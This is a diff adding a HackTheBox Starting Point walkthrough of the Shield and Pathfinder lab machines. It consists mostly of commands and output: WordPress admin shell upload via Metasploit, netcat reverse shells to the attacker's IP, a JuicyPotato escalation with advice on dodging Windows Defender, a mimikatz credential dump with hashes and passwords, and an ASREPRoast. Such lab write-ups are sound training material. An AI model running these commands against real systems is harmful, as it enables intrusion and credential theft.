@@ -644,7 +644,7 @@ af13b0bee69f8a877c3faf667f7beacf
 
 
 
-## Vaccine
+## Vaccine (Linux, FTP, Apache, SSH and Postgresql)
 
 ### Enumeration
 
@@ -1081,5 +1081,814 @@ root@vaccine:~# cat root.txt
 cat root.txt
 dd6e058e814260bc70e9bbdef2715849
 root@vaccine:~# 
+```
+
+
+
+## Shield (Microsoft, IIS and Mysql)
+
+### Enumeration
+
+**Note**: this starting point machine only features a `root.txt`
+
+We begin by running an Nmap scan.
+
+```
+nmap -A -v 10.10.10.29 -p-
+```
+
+From the Nmap output, we find that IIS and MySQL are running on their  default ports. IIS (Internet Information Services) is a Web Server  created by Microsoft. 
+
+```
+# nmap -A -v 10.10.10.29 -p-
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 20:11 EST
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:11
+Completed NSE at 20:11, 0.00s elapsed
+Initiating NSE at 20:11
+Completed NSE at 20:11, 0.00s elapsed
+Initiating NSE at 20:11
+Completed NSE at 20:11, 0.00s elapsed
+Initiating Ping Scan at 20:11
+Scanning 10.10.10.29 [4 ports]
+Completed Ping Scan at 20:11, 0.26s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:11
+Completed Parallel DNS resolution of 1 host. at 20:11, 0.03s elapsed
+Initiating SYN Stealth Scan at 20:11
+Scanning 10.10.10.29 [65535 ports]
+Discovered open port 3306/tcp on 10.10.10.29
+Discovered open port 80/tcp on 10.10.10.29
+SYN Stealth Scan Timing: About 6.36% done; ETC: 20:19 (0:07:36 remaining)
+SYN Stealth Scan Timing: About 17.50% done; ETC: 20:17 (0:04:48 remaining)
+SYN Stealth Scan Timing: About 31.41% done; ETC: 20:16 (0:03:19 remaining)
+SYN Stealth Scan Timing: About 47.39% done; ETC: 20:15 (0:02:14 remaining)
+SYN Stealth Scan Timing: About 65.26% done; ETC: 20:15 (0:01:20 remaining)
+SYN Stealth Scan Timing: About 84.69% done; ETC: 20:15 (0:00:33 remaining)
+Completed SYN Stealth Scan at 20:14, 202.95s elapsed (65535 total ports)
+Initiating Service scan at 20:14
+Scanning 2 services on 10.10.10.29
+Completed Service scan at 20:15, 6.53s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.10.10.29
+Retrying OS detection (try #2) against 10.10.10.29
+Initiating Traceroute at 20:15
+Completed Traceroute at 20:15, 0.24s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 20:15
+Completed Parallel DNS resolution of 2 hosts. at 20:15, 0.03s elapsed
+NSE: Script scanning 10.10.10.29.
+Initiating NSE at 20:15
+Completed NSE at 20:15, 4.18s elapsed
+Initiating NSE at 20:15
+Completed NSE at 20:15, 1.47s elapsed
+Initiating NSE at 20:15
+Completed NSE at 20:15, 0.00s elapsed
+Nmap scan report for 10.10.10.29
+Host is up (0.23s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
+Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.198 days (since Thu Mar 11 15:30:37 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   226.70 ms 10.10.14.1
+2   227.05 ms 10.10.10.29
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:15
+Completed NSE at 20:15, 0.00s elapsed
+Initiating NSE at 20:15
+Completed NSE at 20:15, 0.00s elapsed
+Initiating NSE at 20:15
+Completed NSE at 20:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 221.78 seconds
+           Raw packets sent: 131291 (5.780MB) | Rcvd: 167 (8.044KB)
+```
+
+Let's navigate to port 80 using a browser. (http://10.10.10.29/)
+
+![web](images/web.png)
+
+We see the default IIS starting page. 
+
+### GoBuster
+
+Let's use GoBuster to scan for any sub-directories or files that are hosted on the server. 
+
+```
+# gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.29/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/11 20:37:41 Starting gobuster
+===============================================================
+/wordpress (Status: 301)
+===============================================================
+2021/03/11 20:39:27 Finished
+===============================================================
+┌──(root💀kali)-[/home/kali]
+```
+
+The scan reveals a folder named `wordpress`. Let's navigate to it (http://10.10.10.29/wordpress).
+
+### Foothold
+
+#### Wordpress
+
+WordPress is a Content Management System (CMS) that can be used to  quickly create websites and blogs. Since we have already acquired the  password `P@s5w0rd!`, we can try to login to the WordPress site. We navigate to http://10.10.10.29/wordpress/wp-login.php and try to guess the username. Some common usernames are `admin` or `administrator`. The combination `admin : P@s5w0rd!` is successful and we gain administrative access to the site.
+
+The administrative access can be leveraged through the msfmodule `exploit/unix/webapp/wp_admin_shell_upload`, to get a meterpreter shell on the system.
+
+```
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
+PASSWORD => P@s5w0rd!
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
+USERNAME => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
+TARGETURI => /wordpress
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.29
+RHOSTS => 10.10.10.29
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.15.4
+LHOST => 10.10.15.4
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
+[*] Started reverse TCP handler on 10.10.15.4:4444 
+[*] Authenticating with WordPress using admin:P@s5w0rd!...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wordpress/wp-content/plugins/PMOoqwMKUM/mOTztKAzjR.php...
+[*] Sending stage (39282 bytes) to 10.10.10.29
+[*] Meterpreter session 2 opened (10.10.15.4:4444 -> 10.10.10.29:51398) at 2021-03-11 21:17:09 -0500
+[!] This exploit may require manual cleanup of 'mOTztKAzjR.php' on the target
+[!] This exploit may require manual cleanup of 'PMOoqwMKUM.php' on the target
+[!] This exploit may require manual cleanup of '../PMOoqwMKUM' on the target
+
+meterpreter > 
+[+] Deleted mOTztKAzjR.php
+[+] Deleted PMOoqwMKUM.php
+
+meterpreter >
+```
+
+A netcat binary is uploaded to the machine for a more stable shell. 
+
+#### Netcat
+
+Let's use the following commands:
+
+```bash
+meterpreter > lcd /home/username/Downloads
+```
+
+lcd stands for "Local Change Directory", which we use to navigate to the local folder where nc.exe is located.
+
+```bash
+meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
+meterpreter > upload nc.exe
+[*] uploading  : /home/kali/Downloads/nc.exe -> nc.exe
+[*] Uploaded -1.00 B of 58.00 KiB (-0.0%): /home/kali/Downloads/nc.exe -> nc.exe
+[*] uploaded   : /home/kali/Downloads/nc.exe -> nc.exe
+```
+
+We then navigate to a writeable directory on the server (in our case `C:/inetpub/wwwroot/wordpress/wp-content/uploads`) and upload netcat. Let's start a netcat listener:
+
+```bash
+# nc -lvp 1234
+```
+
+Next, we can execute the following command in the meterpreter session to get a netcat shell:
+
+```bash
+msf > execute -f nc.exe -a "-e cmd.exe 10.10.15.4 1234"
+```
+
+```
+# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.4] from (UNKNOWN) [10.10.10.29] 51413
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>systeminfo
+systeminfo
+
+Host Name:                 SHIELD
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00376-30000-00299-AA303
+Original Install Date:     2/4/2020, 12:58:01 PM
+System Boot Time:          3/11/2021, 7:25:58 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 908 MB
+Virtual Memory: Max Size:  2,431 MB
+Virtual Memory: Available: 1,274 MB
+Virtual Memory: In Use:    1,157 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    MEGACORP.LOCAL
+Logon Server:              N/A
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB4520724
+                           [03]: KB4524244
+                           [04]: KB4537764
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.29
+                                 [02]: fe80::6d25:8198:9b5f:9b4d
+                                 [03]: dead:beef::6d25:8198:9b5f:9b4d
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+### Privilege Escalation
+
+Running the `sysinfo` command on the meterpreter session, we notice that this is a Windows Server 2016 OS, which is vulnerable to the [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) exploit. 
+
+#### Juicy Potato
+
+Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the `SeAssignPrimaryToken` or `SeImpersonate` privilege in a MiTM attack.
+
+We can exploit this by uploading the Juicy Potato [binary](https://github.com/ohpe/juicy-potato) and executing it. As before, we can use our meterpreter shell to do the upload and then we can use the netcat shell to execute the exploit.
+
+```bash
+meterpreter > lcd /home/username/Downloads
+meterpreter > upload JuicyPotato.exe
+```
+
+**Note**: We will have to rename the Juicy Potato executable to something else, otherwise it will be picked up by Windows Defender.
+
+```mv powershell
+meterpreter > mv JuicyPotato.exe js.exe
+```
+
+We can create a batch file that will be executed by the exploit, and return a SYSTEM shell. Let's add the following contents to `shell.bat`:
+
+```cmd
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.4 1111 > shell.bat
+```
+
+Let's start another netcat listener:
+
+```bash
+nc -lvp 1111
+```
+
+Next, we execute the netcat shell using the following command.
+
+```powershell
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>
+```
+
+**Note**: We can use another CLSID `-c {bb6df56b-cace-11dc-9992-0019b93a3a84}`, if our payload is not working.
+
+The root flag is located in `C:\Users\Administrator\Desktop`.
+
+### Post Exploitation
+
+Mimikatz can be used to dump cached passwords. 
+
+```bash
+meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
+meterpreter > lcd /home/kali/Downloads
+meterpreter > upload mimikatz.exe
+[*] uploading  : /home/kali/Downloads/mimikatz.exe -> mimikatz.exe
+[*] Uploaded -1.00 B of 1.25 MiB (0.0%): /home/kali/Downloads/mimikatz.exe -> mimikatz.exe
+[*] uploaded   : /home/kali/Downloads/mimikatz.exe -> mimikatz.exe
+```
+
+We execute mimikatz and use the sekurlsa command to extract logon passwords:
+
+```powershell
+PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> ./mimikatz.exe
+./mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 217126 (00000000:00035026)
+Session           : Interactive from 1
+User Name         : sandra
+Domain            : MEGACORP
+Logon Server      : PATHFINDER
+Logon Time        : 3/11/2021 7:27:25 PM
+SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
+	msv :	
+	 [00000003] Primary
+	 * Username : sandra
+	 * Domain   : MEGACORP
+	 * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
+	 * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
+	 * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
+	tspkg :	
+	wdigest :	
+	 * Username : sandra
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : sandra
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : Password1234!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 65638 (00000000:00010066)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:08 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SHIELD$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:07 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : shield$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 36403 (00000000:00008e33)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:07 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 209672 (00000000:00033308)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:27:04 PM
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 167544 (00000000:00028e78)
+Session           : Service from 0
+User Name         : wordpress
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:25 PM
+SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:12 PM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:08 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 65619 (00000000:00010053)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:08 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
+	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SHIELD$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 3/11/2021 7:26:07 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : SHIELD$
+	 * Domain   : MEGACORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : shield$
+	 * Domain   : MEGACORP.LOCAL
+	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+	ssp :	
+	credman :	
+
+```
+
+And we find the password `Password1234!` for domain user `Sandra`.
+
+## Pathfinder (Kerberos, LDAP, WinRM)
+
+### Enumeration
+
+```
+# masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-03-15 01:33:19 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 49664/tcp on 10.10.10.30                                  
+Discovered open port 49677/tcp on 10.10.10.30                                  
+Discovered open port 3268/tcp on 10.10.10.30                                   
+Discovered open port 593/tcp on 10.10.10.30                                    
+Discovered open port 49676/tcp on 10.10.10.30                                  
+Discovered open port 53/tcp on 10.10.10.30                                     
+Discovered open port 49667/tcp on 10.10.10.30                                  
+Discovered open port 49698/tcp on 10.10.10.30                                  
+Discovered open port 445/tcp on 10.10.10.30                                    
+Discovered open port 5985/tcp on 10.10.10.30                                   
+Discovered open port 88/tcp on 10.10.10.30                                     
+Discovered open port 636/tcp on 10.10.10.30                                    
+Discovered open port 49683/tcp on 10.10.10.30                                  
+Discovered open port 49717/tcp on 10.10.10.30                                  
+Discovered open port 47001/tcp on 10.10.10.30                                  
+Discovered open port 3269/tcp on 10.10.10.30                                   
+Discovered open port 464/tcp on 10.10.10.30                                    
+Discovered open port 49672/tcp on 10.10.10.30                                  
+Discovered open port 9389/tcp on 10.10.10.30                                   
+Discovered open port 139/tcp on 10.10.10.30                                    
+Discovered open port 49666/tcp on 10.10.10.30                                  
+Discovered open port 135/tcp on 10.10.10.30                                    
+Discovered open port 389/tcp on 10.10.10.30                                    
+Discovered open port 49665/tcp on 10.10.10.30               
+```
+
+Port 88 is typically associated with Kerberos and port 389 with LDAP,  which indicates that this is a Domain Controller. We note that WinRM is  enabled on port 5985.
+
+```
+# python3 bloodhound.py -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
+```
+
+Using the credentials we obtained in a previous machine; `sandra:Password1234!`, we can attempt to enumerate Active Directory. We can achieve this using BloodHound. There is a python bloodhound injester, which can be found [here](https://github.com/fox-it/BloodHound.py). It can also be installed using pip: `pip install bloodhound`
+
+```
+(root💀kali)-[/home/kali/Documents/tools/BloodHound.py]
+└─# python3 bloodhound.py \
+-d megacorp.local \
+-u sandra -p "Password1234!" \
+-gc pathfinder.megacorp.local \
+-c all -ns 10.10.10.30
+INFO: Found AD domain: megacorp.local
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 5 users
+INFO: Connecting to GC LDAP server: pathfinder.megacorp.local
+INFO: Found 51 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
+INFO: Done in 00M 54S
+```
+
+The json files should now be in the working directory, ready to be imported into BloodHound.
+
+```
+┌──(root💀kali)-[/home/kali/Documents/tools/BloodHound.py]
+└─# ls -l *.json
+-rw-r--r-- 1 root root  3222 Mar 14 22:40 computers.json
+-rw-r--r-- 1 root root  3243 Mar 14 22:40 domains.json
+-rw-r--r-- 1 root root 85362 Mar 14 22:40 groups.json
+-rw-r--r-- 1 root root 12521 Mar 14 22:40 users.json
+```
+
+**Installing and Starting BloodHound**
+
+First, we need to install neo4j and BloodHound.
+
+```bash
+apt install neo4j
+apt install bloodhound
+```
+
+Next, we need to configure the neo4j service. We can accomplish this by running the following command
+
+```bash
+# neo4j console
+Directories in use:
+  home:         /usr/share/neo4j
+  config:       /usr/share/neo4j/conf
+  logs:         /usr/share/neo4j/logs
+  plugins:      /usr/share/neo4j/plugins
+  import:       /usr/share/neo4j/import
+  data:         /usr/share/neo4j/data
+  certificates: /usr/share/neo4j/certificates
+  run:          /usr/share/neo4j/run
+Starting Neo4j.
+WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+2021-03-15 02:51:55.277+0000 INFO  Starting...
+2021-03-15 02:51:59.058+0000 INFO  ======== Neo4j 4.2.1 ========
+2021-03-15 02:52:01.980+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
+2021-03-15 02:52:02.011+0000 INFO  Setting up initial user from defaults: neo4j
+2021-03-15 02:52:02.012+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
+2021-03-15 02:52:02.020+0000 INFO  Setting version for 'security-users' to 2
+2021-03-15 02:52:02.024+0000 INFO  After initialization of system graph model component 'security-users' have version 2 and status CURRENT
+2021-03-15 02:52:02.031+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
+2021-03-15 02:52:02.315+0000 INFO  Bolt enabled on localhost:7687.
+2021-03-15 02:52:04.037+0000 INFO  Remote interface available at http://localhost:7474/
+2021-03-15 02:52:04.039+0000 INFO  Started.
+
+```
+
+You will be then prompted to change your password. Next, we start BloodHound
+
+```bash
+bloodhound --no-sandbox
+```
+
+Ensure you have a connection to the database; indicated by a ✔️  symbol at the top of the three input fields. The default username is `neo4j` with the password previously set.
+
+Opening BloodHound, we can drag and drop the .json files, and  BloodHound will begin to analyze the data. We can select various  queries, of which some very useful ones are `Shortest Paths to High value Targets` and `Find Principles with DCSync Rights`.
+
+While the latter query returns this:
+
+![img](images/bloodhound.png)
+
+![HackTheBox-StartingPoint-PathFinder-bloodhound2.png](images/800px-HackTheBox-StartingPoint-PathFinder-bloodhound2.png)
+
+We can see that the `svc_bes` has `GetChangesAll`  privileges to the domain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.
+
+### Lateral Movement
+
+It's worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to [ASREPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/). We can check this using a tool such as Impacket's `GetNPUsers`.
+
+```
+# git clone https://github.com/SecureAuthCorp/impacket.git
+# cd impacket/examples
+(root💀kali)-[/home/kali/Documents/tools/impacket/examples]
+└─# python3 GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for svc_bes
+$krb5asrep$23$svc_bes@MEGACORP.LOCAL:5fed9e70404f9f3e533da75fc5c8a6e0$feea6f77a795ab07264edf21ebafd039c5699560ef4116548f52ffc426481cb9c7da3bc26577cdf80732e9ddac1e3125d6f51b9c79d4d9f6943a4c9114eff8eeb8571ee07c9a8ae69c0c5235ebc5b0b8a6591eb02257ad04af50bbe0e9ced2311e9c7413bbf70faf43b2d0c64114e5bfbbef8f475df64f9a7d21c981aac73398f330e97f1439829d5f5f28cdd0a3b0d62764e1f46bfd9a1034c72ec5a635dbac32254263a51ac7eb4f3e8b202f25180f5d28a78110030cdba67e6d2c24db91c5946e983082b3f60c7f156d056a83fcb92a4f5eff7ef8bb7ee6fd2f5d71c05847e76022b10640dc5d2cfa06b23f5f93cc
+```
+
+We obtain the TGT ticket for the `svc_bes` and save it to a file called `hash`. We can use Hashcat or JTR in conjunction with `rockyou.txt` to obtain the plaintext password `Sheffield19`
+
+```
